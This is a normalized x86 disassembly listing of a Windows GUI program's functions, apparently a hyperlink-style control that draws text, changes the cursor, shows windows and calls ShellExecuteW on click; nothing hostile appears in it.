lea eax [ esi + 0x78 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x3
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_42ae90
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
cmp [ esi + 0x24 ] 0x0
push edi
mov [ esp + 0x18 ] eax
je r-xdata
mov ecx [ esp + 0x2c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ esp + 0x10 ]
lea eax [ esp + 0x14 ]
mov [ esp + 0x10 ] 0x0
call sub_414260
mov eax [ esp + 0x14 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x8 ]
mov eax [ edi + 0xa0 ]
mov ebx [ ecx ]
test eax eax
jne r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
je r-xdata
push eax
push ebx
call [ SelectObject@IAT ]
push 0x1
push ebx
mov [ esp + 0x18 ] eax
call [ SetBkMode@IAT ]
xor eax eax
mov ecx 0xff0000
cmp [ esi + 0x4 ] eax
je r-xdata
mov eax [ rw-data ]
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov edi [ esi + 0x38 ]
mov ecx [ ebx + 0xc ]
sub edi [ esi + 0x30 ]
mov edx [ ebx + 0x10 ]
xor eax eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
lea eax [ esi + 0x30 ]
mov [ esp + 0x24 ] ecx
mov [ esp + 0x28 ] edx
cmp ecx edi
jne r-xdata
cmp [ esi + 0x74 ] 0x0
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x80 ]
mov ecx [ ecx + 0x84 ]
mov ecx [ esi + 0x4 ]
movzx ecx [ ecx + 0xa9 ]
mov edx [ ebx ]
mov edx [ edx + 0x18 ]
push ecx
lea ecx [ esp + 0x20 ]
push ecx
push eax
mov eax [ esp + 0x24 ]
push eax
mov ecx ebx
call edx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax + 0xc ]
sub ecx [ eax + 0x4 ]
cmp edx ecx
je r-xdata
mov edi [ SetTextColor@IAT ]
push eax
push ebx
call edi
mov [ esp + 0x14 ] eax
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x9c ]
dec ecx
mov edx 0x8024
je r-xdata
mov eax ecx
mov ecx [ esi + 0x4 ]
movzx ecx [ ecx + 0xa9 ]
mov edx [ ebx ]
mov edx [ edx + 0x14 ]
push ecx
lea ecx [ esp + 0x20 ]
push ecx
push eax
mov eax [ esp + 0x24 ]
push eax
mov ecx ebx
call edx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
mov edx 0x8025
dec ecx
jne r-xdata
push edx
mov edx [ eax + 0x98 ]
lea ecx [ esi + 0x30 ]
push ecx
push 0xffffffff
push edx
push ebx
call [ DrawTextW@IAT ]
mov eax [ esp + 0x14 ]
push eax
push ebx
call edi
mov ecx [ esp + 0x10 ]
push ecx
push ebx
call [ SelectObject@IAT ]
mov edx 0x8026
jmp r-xdata
sub_42b070
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi - 0x70 ]
mov edx [ eax + 0x78 ]
lea esi [ edi - 0x70 ]
mov ecx esi
call edx
test al al
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov ebx [ ebp + 0xc ]
cmp ebx 0x2a3
jne r-xdata
cmp ebx 0x20
jne r-xdata
mov [ edi + 0x4 ] 0x0
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ edi - 0x49 ] 0x0
je r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ esi + 0x25 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
movsx ecx ax
shr eax 0x10
cwde
push eax
push ecx
lea edx [ edi - 0x40 ]
push edx
call [ PtInRect@IAT ]
test eax eax
setne cl
mov eax ebx
sub eax 0x200
mov [ edi + 0x4 ] cl
je r-xdata
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x1
mov ecx [ edi - 0x6c ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov eax esi
call sub_426dd0
dec eax
je r-xdata
mov eax [ edi - 0x6c ]
mov ecx [ eax + 0x5c ]
push ecx
call [ SetCursor@IAT ]
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
push 0x7f89
push 0x0
call [ LoadCursorW@IAT ]
mov edx [ edi - 0x6c ]
mov [ edx + 0x5c ] eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
test cl cl
je r-xdata
dec eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ecx ] 0x1
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
test cl cl
je r-xdata
cmp [ eax + 0xab ] 0x0
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x1
call sub_42b1c0
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_42b1c0
push ebp
mov ebp esp
push 0xffffffff
push sub_44accd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x420
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ esi + 0x78 ]
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x14 ]
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
push 0x0
push eax
push 0x111
push esi
call edx
add eax 0xfffffff0
call sub_4025f0
lea edi [ eax + 0x10 ]
mov [ ebp - 0x424 ] edi
mov [ ebp - 0x4 ] 0x1
cmp [ esi + 0x80 ] 0x0
je r-xdata
cmp [ esi + 0x7c ] 0x0
je r-xdata
lea eax [ ebp - 0x42c ]
push eax
mov ecx r--data
call sub_402a00
mov [ ebp - 0x4 ] 0x2
mov ebx [ esi + 0x80 ]
push eax
lea ecx [ ebp - 0x428 ]
push ecx
call sub_401b20
add esp 0x8
mov [ ebp - 0x4 ] 0x3
mov eax [ eax ]
mov ecx [ eax - 0xc ]
push ecx
push eax
lea ebx [ ebp - 0x424 ]
call sub_402ab0
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x428 ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
xor ecx ecx
push 0x40e
push ecx
lea edx [ ebp - 0x41e ]
push edx
mov [ ebp - 0x420 ] cx
call memset
push edi
push r--data
lea eax [ ebp - 0x420 ]
push 0x208
push eax
call [ _snwprintf@IAT ]
add esp 0x1c
push 0xa
push 0x0
lea ecx [ ebp - 0x420 ]
push ecx
push r--data
push r--data
push 0x5
push 0x0
push 0x0
push edi
push r--data
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x42c ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push edi
call eax
jmp r-xdata
push 0x0
call [ ShellExecuteW@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
add edi 0xfffffff0
lea edx [ edi + 0xc ]
or eax 0xffffffff
[ edx ] eax
dec eax
test eax eax
jg r-xdata
mov edi [ ebp - 0x424 ]
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_42b390
push ebp
mov ebp esp
push 0xffffffff
push sub_448688
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_42b6c0
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0xc ] 0x17
mov [ esi + 0x1c ] eax
mov [ esi + 0x68 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_42b410
push ebp
mov ebp esp
push 0xffffffff
push sub_448658
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_42b7c0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42b480
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x500
push ebx
push esi
push edi
mov edi ecx
jne r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ebx [ ebp + 0x10 ]
cmp eax 0x9
je r-xdata
cmp [ edi - 0x54 ] 0x0
je r-xdata
cmp [ esi + 0x24 ] 0x0
mov [ esi + 0x74 ] 0x1
je r-xdata
cmp eax 0x16
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax [ edi - 0x54 ]
mov ecx [ eax ]
mov esi [ edi - 0x68 ]
lea ebx [ edi - 0x70 ]
mov [ ebp + 0xc ] ecx
call sub_42b5e0
mov edx [ ebp + 0xc ]
mov ecx [ edi - 0x54 ]
push eax
mov eax [ edx + 0x10 ]
push esi
push 0x500
push ebx
call eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
push ebx
lea eax [ edi - 0x70 ]
push eax
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ edi - 0x54 ] 0x0
je r-xdata
push ebx
lea ecx [ edi - 0x70 ]
push ecx
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ edi - 0x54 ]
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push ebx
push eax
push esi
call edx
cmp [ esi + 0x26 ] 0x0
je r-xdata
call sub_42b550
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_42b550
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebx + 0x78 ]
sub esi [ ebx + 0x74 ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x74 ]
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
inc edi
cmp edi esi
jl r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx [ ebp + 0xc ]
je r-xdata
mov ecx [ eax + 0xc ]
cmp ecx 0x9
je r-xdata
cmp [ eax + 0x24 ] 0x0
mov [ eax + 0x74 ] 0x0
je r-xdata
cmp ecx 0x16
jne r-xdata
cmp [ eax + 0x25 ] 0x0
je r-xdata
push 0x0
mov ecx eax
call sub_42e9c0
jmp r-xdata
cmp [ eax + 0x26 ] 0x0
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
cmp [ edx + 0xab ] 0x0
mov ebx [ ecx ]
sete dl
movzx edx dl
push 0x0
push edx
push eax
mov eax [ ebx + 0x20 ]
call eax
mov ebx [ ebp + 0x8 ]
sub_42b5e0
push esi
push edi
mov edi [ ebx + 0x78 ]
sub edi [ ebx + 0x74 ]
xor esi esi
sar edi 0x2
test edi edi
jle r-xdata
pop edi
or eax 0xffffffff
pop esi
retn
mov eax [ ebx + 0x74 ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
cmp ecx 0x16
jne r-xdata
cmp ecx 0x9
jne r-xdata
push 0x0
push rw-data
push rw-data
push 0x0
push eax
call __RTDynamicCast
add esp 0x14
cmp [ eax + 0x74 ] 0x0
jmp r-xdata
inc esi
cmp esi edi
jl r-xdata
push 0x0
push rw-data
push rw-data
push 0x0
push eax
call __RTDynamicCast
add esp 0x14
cmp [ eax + 0x74 ] 0x0
jne r-xdata
pop edi
mov eax esi
pop esi
retn
sub_42b670
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call [ `placement delete closure'@IAT ]
add esp 0x4
mov [ esi + 0x10 ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42b6c0
push ebp
mov ebp esp
push 0xffffffff
push sub_448632
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_40e3c0
xor ebx ebx
mov [ ebp - 0x4 ] ebx
lea edi [ esi + 0x70 ]
push edi
call sub_412a20
mov ecx 0x1
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x140 ]
mov [ esi ] r--data
mov [ edi ] r--data
mov [ eax ] r--data
mov [ ebp - 0x10 ] eax
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ ebp - 0x4 ] 0x3
mov [ esi + 0x13c ] ebx
mov [ ebp - 0x4 ] 0x4
mov [ esi + 0x154 ] r--data
mov [ ebp - 0x4 ] 0x5
mov [ esi ] r--data
mov [ edi ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] ecx
mov [ esi + 0x158 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42b790
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_42b7c0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42b7c0
push ebp
mov ebp esp
push 0xffffffff
push sub_4485c7
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ esi + 0x154 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x3
lea ecx [ esi + 0x140 ]
call sub_427df0
mov [ ebp - 0x4 ] 0x2
lea ecx [ esi + 0x70 ]
call sub_412b40
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_42b870
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
cmp [ ecx - 0x12e ] 0x0
je r-xdata
xor eax eax
pop ebp
retn 0x14
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x18 ]
push edi
push eax
mov eax [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push eax
push edx
lea edi [ ecx - 0xe4 ]
call sub_4130a0
pop edi
pop esi
pop ebp
retn 0x14
sub_42b8e0
push ebx
push esi
mov esi ecx
mov ecx [ esi + 0x18 ]
mov eax [ esi ]
mov edx [ eax + 0x18 ]
push edi
push ecx
mov ecx esi
call edx
mov edi [ esi + 0x78 ]
sub edi [ esi + 0x74 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
mov eax [ esi + 0x18 ]
mov edx [ ecx ]
mov edx [ edx + 0xc ]
push eax
push esi
call edx
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x74 ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
inc ebx
cmp ebx edi
jl r-xdata
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push 0x0
call eax
sub_42b940
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
test esi esi
jne r-xdata
mov ecx [ edi + 0x18 ]
mov eax [ edi ]
mov edx [ eax + 0x14 ]
push ecx
mov ecx edi
call edx
test al al
je r-xdata
pop edi
xor al al
pop esi
pop ebp
retn 0x4
mov eax [ esi ]
mov edx [ eax + 0x58 ]
mov ecx esi
call edx
cmp [ edi + 0x25 ] 0x0
mov [ edi + 0x1c ] eax
jne r-xdata
mov edx [ edi ]
mov eax [ edx + 0x64 ]
mov ecx edi
call eax
mov al 0x1
mov [ edi + 0x25 ] al
pop edi
pop esi
pop ebp
retn 0x4
cmp [ edi + 0x158 ] 0x0
je r-xdata
lea ecx [ edi + 0x154 ]
mov [ ebp + 0x8 ] ecx
lea esi [ eax + 0x28 ]
lea ecx [ ebp + 0x8 ]
call sub_428170
sub_42b9b0
push ebx
push esi
mov ebx ecx
mov esi [ ebx + 0x78 ]
sub esi [ ebx + 0x74 ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
inc edi
cmp edi esi
jl r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
call eax
sub_42b9e0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
mov eax [ esi + 0x40 ]
mov edx [ esi + 0x44 ]
lea ecx [ esi + 0x40 ]
mov [ ebp - 0x10 ] edx
mov edx [ ecx + 0xc ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x14 ] eax
mov eax [ ecx + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x8 ] edx
mov edx [ eax + 0xc ]
mov [ ecx + 0xc ] edx
mov edx [ eax ]
mov [ esi + 0x30 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x34 ] edx
mov edx [ eax + 0x8 ]
mov [ esi + 0x38 ] edx
mov edx [ eax + 0xc ]
mov [ esi + 0x3c ] edx
mov edx [ eax ]
mov [ esi + 0x50 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x54 ] edx
mov edx [ eax + 0x8 ]
push ecx
mov [ esi + 0x58 ] edx
mov eax [ eax + 0xc ]
lea ecx [ ebp - 0x14 ]
push ecx
mov [ esi + 0x5c ] eax
call [ EqualRect@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov edx [ esi ]
mov eax [ edx + 0x64 ]
mov ecx esi
call eax
sub_42ba80
push ebx
push esi
mov ebx ecx
mov esi [ ebx + 0x78 ]
sub esi [ ebx + 0x74 ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
inc edi
cmp edi esi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x68 ]
call eax
sub_42bac0
push ebp
mov ebp esp
push edi
mov edi ecx
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov al [ ebp + 0x8 ]
push ebx
push esi
mov [ edi + 0x26 ] al
mov esi [ edi + 0x78 ]
sub esi [ edi + 0x74 ]
xor ebx ebx
sar esi 0x2
test al al
jne r-xdata
xor al al
pop edi
pop ebp
retn 0x4
test esi esi
jle r-xdata
test esi esi
jle r-xdata
pop esi
pop ebx
mov al 0x1
pop edi
pop ebp
retn 0x4
mov edx [ edi + 0x74 ]
mov eax [ edx + ebx * 4 ]
test eax eax
je r-xdata
mov edi edi
inc ebx
cmp ebx esi
jl r-xdata
cmp [ eax + 0x24 ] 0x0
je r-xdata
inc ebx
cmp ebx esi
jl r-xdata
cmp [ eax + 0x24 ] 0x0
je r-xdata
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax [ edi + 0x74 ]
mov eax [ eax + ebx * 4 ]
test eax eax
je r-xdata
pop esi
pop ebx
mov al 0x1
pop edi
pop ebp
retn 0x4
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax [ eax + 0x60 ]
push 0x5
push eax
call [ ShowWindow@IAT ]
mov ecx [ eax + 0x60 ]
push 0x0
push ecx
call [ ShowWindow@IAT ]
sub_42bb60
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x74 ]
call edx
test al al
je r-xdata
pop esi
pop ebp
retn 0xc
mov eax [ esi + 0x78 ]
sub eax [ esi + 0x74 ]
push edi
sar eax 0x2
xor edi edi
test eax eax
je r-xdata
pop edi
push ebx
mov ebx [ ebp + 0x10 ]
mov eax [ esi + 0x78 ]
sub eax [ esi + 0x74 ]
inc edi
sar eax 0x2
cmp edi eax
jb r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov ecx [ esi + 0x74 ]
mov ecx [ ecx + edi * 4 ]
test ecx ecx
je r-xdata
pop ebx
cmp [ ecx + 0x25 ] 0x0
je r-xdata
cmp [ ecx + 0x26 ] 0x0
je r-xdata
cmp [ ecx + 0x68 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ecx ]
mov edx [ edx + 0x30 ]
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call edx
sub_42bbd0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
jne r-xdata
pop esi
pop ebp
retn 0x8
mov eax [ esi + 0x78 ]
sub eax [ esi + 0x74 ]
push edi
sar eax 0x2
xor edi edi
test eax eax
je r-xdata
pop edi
push ebx
mov ebx [ ebp + 0xc ]
mov ecx [ esi + 0x78 ]
sub ecx [ esi + 0x74 ]
inc edi
sar ecx 0x2
cmp edi ecx
jb r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push ebx
push 0x0
call eax
mov ecx [ esi + 0x74 ]
mov ecx [ ecx + edi * 4 ]
test ecx ecx
je r-xdata
pop ebx
sub_42bc20
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
push ebx
mov ebx ecx
push esi
mov [ ebx + 0x2a ] al
mov esi [ ebx + 0x78 ]
sub esi [ ebx + 0x74 ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
lea ecx [ ecx ]
inc edi
cmp edi esi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov ecx [ ebx + 0x74 ]
mov ecx [ ecx + edi * 4 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x38 ]
push eax
call edx
sub_42bc70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov ebx ecx
push edi
mov [ ebx + 0x24 ] al
test al al
jne r-xdata
mov esi [ ebx + 0x78 ]
sub esi [ ebx + 0x74 ]
xor edi edi
sar esi 0x2
test esi esi
jle r-xdata
mov [ ebx + 0x29 ] 0x0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ ebx + 0x74 ]
mov ecx [ ecx + edi * 4 ]
test ecx ecx
je r-xdata
inc edi
cmp edi esi
jl r-xdata
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4c ]
call eax
mov eax [ ebp + 0x8 ]
sub_42bcc0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
push edi
mov [ esi + 0x28 ] dl
test dl dl
je r-xdata
mov edi [ esi + 0x78 ]
sub edi [ esi + 0x74 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
mov eax [ esi + 0x4 ]
mov [ esi + 0x24 ] 0x0
mov [ esi + 0x29 ] 0x0
test eax eax
je r-xdata
push edx
lea eax [ esi + 0x70 ]
call sub_413180
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
lea ebx [ ebx ]
call sub_4142d0
mov edx [ ebp + 0x8 ]
inc ebx
cmp ebx edi
jl r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0x40 ]
call edx
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x74 ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
sub_42bd30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn 0xc
cmp [ ecx - 0x54 ] 0x0
je r-xdata
mov ecx [ ecx - 0x54 ]
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push esi
push eax
mov eax [ edx + 0x20 ]
call eax
pop esi
sub_42bd80
push ebp
mov ebp esp
mov ecx [ ecx - 0x54 ]
push esi
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0x14
mov eax [ ebp + 0x18 ]
mov esi [ ebp + 0x8 ]
mov edx [ ecx ]
mov edx [ edx + 0x30 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp + 0xc ]
mov [ eax + 0x4 ] esi
mov esi [ ebp + 0x10 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp + 0x14 ]
mov [ eax + 0xc ] esi
call edx
sub_42bdc0
push ebp
mov ebp esp
mov ecx [ ecx - 0x54 ]
push esi
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0x14
mov eax [ ebp + 0x18 ]
mov esi [ ebp + 0x8 ]
mov edx [ ecx ]
mov edx [ edx + 0x34 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp + 0xc ]
mov [ eax + 0x4 ] esi
mov esi [ ebp + 0x10 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp + 0x14 ]
mov [ eax + 0xc ] esi
call edx
sub_42be00
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0xc ] 0x111
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ esi ]
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx [ ebp + 0xc ]
push ebx
push edx
mov edx [ eax + 0x18 ]
push ecx
push edi
mov ecx esi
call edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
